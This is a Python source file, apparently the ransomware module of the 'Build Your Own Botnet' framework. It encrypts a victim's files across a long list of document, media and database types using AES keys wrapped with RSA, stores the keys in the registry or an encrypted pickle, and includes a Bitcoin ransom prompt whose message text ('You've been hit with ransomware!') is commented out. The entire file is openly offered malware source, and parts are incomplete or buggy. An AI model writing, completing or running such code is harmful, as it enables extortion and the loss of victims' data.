#!/usr/bin/python
# -*- coding: utf-8 -*-
'Ransom (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import base64
import shlex
import hashlib
import queue
import traceback
import re
import pickle
import threading
try:
    # import tkinter
    # import tkinter.messagebox
    import os
except:
    pass

if sys.version_info[0] > 2:
    from queue import Queue
    from io import BytesIO
    # from tkinter import messagebox, Tk
else:
    from Queue import Queue
    from StringIO import StringIO  # Python 2
    # from Tkinter import Tk
    # import tkMessageBox as messagebox


# packages
import Crypto.Cipher.AES
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP
import Crypto.Random
# from tkinter import Tk
# from tkinter import messagebox


if sys.platform == 'win32':
    import _winreg


# utilities
from util import *

# globals
packages = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
platforms = ['win32']
threads = {}
tasks = queue.Queue()
registry_key = hashlib.sha256(mac_address().encode('utf-8')).hexdigest() # hashlib.md5(mac_address()).hexdigest()
filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
             '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
             '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
             '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf',
             '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpe', '.jpeg','.tmp','.log','.py',
             '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.rwl', '.rw2','.pyc',
             '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw',  '.r3d', '.ptx','.css',
             '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.html',
             '.css','.js','.rb','.xml','.wmi','.sh','.asp','.aspx','.plist','.sql','.vbs','.ps1','.sqlite']
usage = 'ransom <encrypt/decrypt/payment> <file_name> [pub key] [priv key]'
description = """
Encrypt the files on a client host machine and ransom the decryption key
back to the currently logged-in user for a payment in Bitcoin to a randomly
generated temporary wallet address that expires in 12 hours
"""

# For linux support we will encrypt a dictionary with all the files and passwords used
# Going to use AES for speed of encryption
encryption_dictionary = {}
encrypted = False # Used to verify if encrypted. If true, save after threader


def _threader(rsa_key):
    global tasks
    try:
        retries = 0
        while True:
            try:
                method, task = tasks.get_nowait()
                if callable(method):
                    method(*task)
                tasks.task_done()
            except Exception as e:
                if retries < 3:
                    retries += 1
                    time.sleep(1)
                    continue
                else:
                    break
        # Check if we encrypted. If we did, save the encrypted_dictionary
        global encrypted
        if encrypted:
            encrypted = False
            encrypt_and_write(rsa_key)

    except Exception as e:
        log("{} error: {}".format(_threader.__name__, str(e)))

@threaded
def _iter_files(rsa_key, base_dir=None): # This acts as both enc & dec file
    try:
        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
            return

        if base_dir: # If this is specified then its encrypt file
            if not os.path.isdir(base_dir):
                log("Target directory '{}' not found".format(base_dir))
            if sys.version_info[0] <= 2:
                return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
            # Python 3 support
            for dirname, _, files in os.walk(base_dir):
                for file in files:
                    globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, file), rsa_key)))
            return "Encrypting Files"
        elif sys.platform == 'win32':
            # This function seems to decrypt a bunch of files in the file system 
            cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'], 0, _winreg.KEY_READ)
            i = 0
            while True:
                try:
                    filename, key, _ = _winreg.EnumValue(reg_key, i)
                    key = cipher.decrypt(base64.b64decode(key))
                    globals()['tasks'].put_nowait((decrypt_file, (filename, key)))
                    i += 1
                except:
                    _winreg.CloseKey(reg_key)
                    break
        else: # This decrypts for mac and linux
            # All files and keys are in encryption_dictionary. Loaded on function start
            for filename, key in encryption_dictionary.items():
                globals()['tasks'].put_nowait((decrypt_file, (filename, key)))

    except Exception as e:
        log('{} error: {}'.format(_iter_files.__name__, str(e)))
        return traceback.format_exc()

def format_rsa(rsa_key, public = True):

    if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
        return rsa_key

    # Add PEM headers and footers
    if public:
        pem_header = "-----BEGIN PUBLIC KEY-----"
        pem_footer = "-----END PUBLIC KEY-----"
    else: 
        pem_header = "-----BEGIN RSA PRIVATE KEY-----"
        pem_footer = "-----END RSA PRIVATE KEY-----"


    # Verify format of the header
    if pem_header + "\n" in rsa_key: # Properly formatter
        pass
    elif pem_header in rsa_key: # Needs newline
        key = rsa_key.split(pem_header)[1]
        rsa_key = f"{pem_header}\n{key}"
    else: # No header present
        rsa_key = f"{pem_header}\n{rsa_key}"        

    # Verify format of the footer
    if pem_footer + "\n" in rsa_key:
        pass
    elif pem_footer in rsa_key:
        key = rsa_key.split(pem_footer)[0]
        rsa_key = f"{key}\n{pem_footer}"
    else:
        rsa_key = f"{rsa_key}\n{pem_footer}"

    # Return the formatted RSA key
    return Crypto.PublicKey.RSA.importKey(rsa_key)



def request_payment(bitcoin_wallet):
    """
    Request ransom payment from user with a Windows alert message box

    `Required`
    :param str bitcoin_wallet:      a valid Bitcoin wallet address

    """
    try:
        # root = tkinter.Tk()
        # root.withdraw()
        # tkinter.messagebox.showwarning('Hackers Are Here', "You've been hit with ransomware! I've encrypted you file and will decrypt them once you send bitcoin payment to this address: <> I wouldn't disable anything on this computer or it'll be irrecoverable ;)")
        print("Hackers are here!")
    except Exception as e:
        print(traceback.format_exc())
        return "Couldn't render alert box with tk"
    return "Launched a Windows Message Box with ransom payment information"

def encrypt_ransom_aes(plaintext, key, padding=chr(0)):
    """
    AES-256-OCB encryption

    `Requires`
    :param str plaintext:   plain text/data
    :param str key:         session encryption key

    `Optional`
    :param str padding:     default: (null byte)

    Returns encrypted ciphertext as base64-encoded string

    """
    try:
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        output = cipher.nonce + tag + ciphertext
    except Exception as e:
        log("{} error: {}".format(decrypt_files.__name__, str(e)))
        return traceback.format_exc()
    return base64.b64encode(output)

def decrypt_ransom_aes(encrypted, key, padding=chr(0)):
    """
    AES-256-OCB decryption

    `Requires`
    :param str ciphertext:  encrypted block of data
    :param str key:         session encryption key

    `Optional`
    :param str padding:     default: (null byte)

    Returns decrypted plaintext as string

    """
    try:
        # Decode the base64-encoded input
        data = BytesIO(base64.b64decode(encrypted))
        
        # Extract nonce, tag, and ciphertext from the combined output
        nonce_size = 12  # Typically 12 bytes for AES-OCB
        tag_size = 16    # Standard tag size
        nonce = data.read(nonce_size)
        tag = data.read(tag_size)
        ciphertext = data.read()  # Remaining bytes
        
        # Initialize the cipher with the nonce
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce=nonce)
        
        # Decrypt and verify the ciphertext
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except Exception as e:
        print(f"Decryption error: {e}")
        traceback.print_exc()
        raise

    return plaintext.decode("utf-8", errors="ignore")

def encrypt_file(filename, rsa_key):
    """
    Encrypt a file with AES-256-OCB symmetric encryption
    using a randomly generated key, encrypt the key
    with RSA-2048 asymmetric encryption, then store the
    filename and RSA-encrypted AES-key as a key in the
    Windows Registry

    `Requires`
    :param str filename:          target filename
    :param RsaKey rsa_key:        2048-bit public RSA key

    Returns True if succesful, otherwise False

    """

    public_key = rsa_key.publickey()

    # Generate AES key
    aes_key = Crypto.Random.get_random_bytes(32)

    # Encrypt AES key with RSA
    cipher_rsa = Crypto.Cipher.PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)

    # Encrypt file content with AES
    cipher_aes = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_EAX)
    with open(filename, 'rb') as f:
        plaintext = f.read()
    ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext)

    # Write encrypted data to output
    with open(filename, 'wb') as f:
        f.write(encrypted_key)  # Write encrypted AES key
        f.write(cipher_aes.nonce)  # Write AES nonce
        f.write(tag)  # Write AES tag
        f.write(ciphertext)  # Write ciphertext

    # try:
    #     if not os.path.isfile(filename):
    #         log("File '{}' not found".format(filename))
    #         return f"file {filename} not found"

    #     log(f"attempting to encypt: {filename}")
    #     print(f"attempting to encypt: {filename}")
    #     # if not os.path.splitext(filename)[1] in globals()['filetypes']:
    #     #     return "Error! Attempting the encrypt unsupported filetype"

    #     # if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
    #     #     return "Error! rsa_key passed into encrypt_file is not valid."

    #     cipher = Crypto.Cipher..PKCS1_OAEP.new(rsa_key.publickey())

    #     with open(filename, 'rb') as fp:
    #         data = fp.read()

    #     ciphertext = cipher.encrypt(data)

    #     with open(filename, 'wb') as fd:
    #         fd.write(ciphertext)

    #     log('{} encrypted'.format(filename))
    #     return '{} encrypted'.format(filename)

    # except Exception as e:
    #     log("{} error: {}".format(encrypt_file.__name__, str(e)))
    #     return "{} error: {}".format(encrypt_file.__name__, str(e))


def decrypt_file(filename, rsa_key):
    """
    Decrypt a file that was encrypted with AES-256-OCB encryption

    `Required`
    :param str filename:    target filename
    :param str aes_key:     256-bit key

    Returns True if succesful, otherwise False

    """


    # Load RSA private key
    private_key = rsa_key

    # Read encrypted file content
    with open(filename, 'rb') as f:
        encrypted_key = f.read(private_key.size_in_bytes())  # Read the encrypted AES key
        nonce = f.read(16)  # Read the AES nonce (16 bytes for AES)
        tag = f.read(16)  # Read the AES tag (16 bytes for AES)
        ciphertext = f.read()  # Read the remaining ciphertext

    # Decrypt AES key with RSA
    cipher_rsa = Crypto.Cipher.PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(encrypted_key)

    # Decrypt ciphertext with AES
    cipher_aes = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_EAX, nonce=nonce)
    plaintext = cipher_aes.decrypt_and_verify(ciphertext, tag)

    # Write the decrypted content to the output file
    with open(filename, 'wb') as f:
        f.write(plaintext)


    # if not os.path.isfile(filename):
    #     log("File '{}' not found".format(filename))
    #     return f"file {filename} not found"

    # try:
    #     with open(filename, 'rb') as fp:
    #         ciphertext = fp.read()


    #     cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
 

    #     plaintext = cipher.decrypt(ciphertext)

    #     with open(filename, 'wb') as fd:
    #         fd.write(plaintext)

    #     log('{} decrypted'.format(filename))
    #     return '{} decrypted'.format(filename)

    # except Exception as e:
    #     log("{} error: {}".format(decrypt_file.__name__, str(e)))
    #     return "{} error: {}".format(decrypt_file.__name__, str(e))


def encrypt_files(args):
    """
    Encrypt all files that are not required for the machine to function

    `Required`
    :param str args:    filename and RSA key separated by a space

    """

    output = shlex.split(args)
    target = output[0]
    pub_key = output[1]
    priv_key = output[2]
    if not os.path.exists(target):
        return "File '{}' does not exist".format(target)


    try:
        rsa_key = format_rsa(priv_key)

        if not rsa_key.can_encrypt():
            return "Error: RSA key cannot encrypt"

        if os.path.isfile(target):
            res = encrypt_file(target, rsa_key)
            encrypt_and_write(rsa_key)
            return res

        if os.path.isdir(target):
            threads = []
            for root, _, files in os.walk(target):
                for file in files:
                    file_path = os.path.join(root, file)
                    thread = threading.Thread(encrypt_file, args=(file_path, rsa_key,))
                    threads.append(thread)
                    print(f"Encrypting {file_path}")

            for thread in threads:
                thread.join()
            # globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
            # globals()['threads']['encrypt_files'] = _threader(rsa_key)

            # Save the encrypted keys as an encrypted file on the system
            # Can be removed whenever or left on system since RSA encrypted
            return "Encrypting files"


        return "Error! End of enrypt file reached"

    except Exception as e:
        log("encrypt_files {} error: {}".format(encrypt_files.__name__, str(e)))
        return traceback.format_exc()
        return "encrypt_files {} error: {}".format(encrypt_files.__name__, str(e))

def decrypt_files(action):
    """
    Decrypt all encrypted files on host machine

    `Required`
    :param str rsa_key:     RSA private key in PEM format

    """


    output = shlex.split(action)

    rsa_key = output[2]
    target = output[0]
    # location, pub, priv

    if not os.path.exists(target):
        return "File '{}' does not exist".format(target)

    try:
        rsa_key = format_rsa(rsa_key, public = False)

        if not rsa_key.has_private():
            return "Error: RSA key cannot decrypt"

        if os.path.isfile(target):
            res = decrypt_file(target, rsa_key)
            return res

        if os.path.isdir(target):
            # globals()['threads']['iter_files'] = _iter_files(rsa_key)
            # globals()['threads']['decrypt_files'] = _threader(rsa_key)
            return "Decrypting files"
    except Exception as e:
        log("decrypt_files {} error: {}".format(decrypt_files.__name__, str(e)))
        return traceback.format_exc()



def decrypt_encryption_dictionary(path, rsa_priv):

    # dict is already loaded as {} then. So we do nothing
    if not os.path.isfile(path): 
        return

    global encryption_dictionary

    rsa_priv = format_rsa(rsa_priv, public = False)

    # Initialize the RSA cipher for decryption
    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_priv)

    with open(path, 'rb') as fd:
        data = fd.read()

    # Decrypt the content
    decrypted_data = cipher.decrypt(data)

    # Load the decrypted content using pickle
    encryption_dictionary = pickle.loads(decrypted_data)


def encrypt_and_write(rsa_key, output_file='enc.rsa'):

    global encryption_dictionary

    # Load the RSA public key
    rsa_key_object = format_rsa(rsa_key)

    # Initialize the RSA cipher for encryption
    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key_object)

    # Serialize and encrypt the encryption_dictionary
    serialized_dict = pickle.dumps(encryption_dictionary)
    encrypted_data = cipher.encrypt(serialized_dict)

    try:
        # Write the encrypted data to the output file
        with open(output_file, 'wb') as fd:
            fd.write(encrypted_data)
    except Exception as e:
        log(e)


def setup(action):
    if 'crypt' not in action:
        return 'Success'

    if sys.platform == 'win32':
        reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'])
        return 'Success'

    # Linux & MacOS
    # Verify loc, pub, and priv key are include in en/de-crypt funcs
    params = action.split(' ')
    if len(params) != 4:
        log("Can't unpack arguments. No public / private key given")
        return "Can't unpack arguments. No private key given"

    decrypt_encryption_dictionary('./enc.rsa', params[3])
    return 'Success'



def run(args=None):
    """
    Run the ransom module

    `Required`
    :param str args:  encrypt, decrypt, payment 

    """
    global usage

    if not args:
        return usage

    # Load the previous dictionary or set up a windows key
    # setup_res = setup(args)
    # if 'Success' not in setup_res:
    #     return setup_res

    cmd, _, action = args.partition(' ')

    if 'payment' in cmd:
        return request_payment(action)
    elif 'decrypt' in cmd:
        return decrypt_files(action)
    elif 'encrypt' in cmd:
        global encrypted
        encrypted = True
        return encrypt_files(action)
    return usage

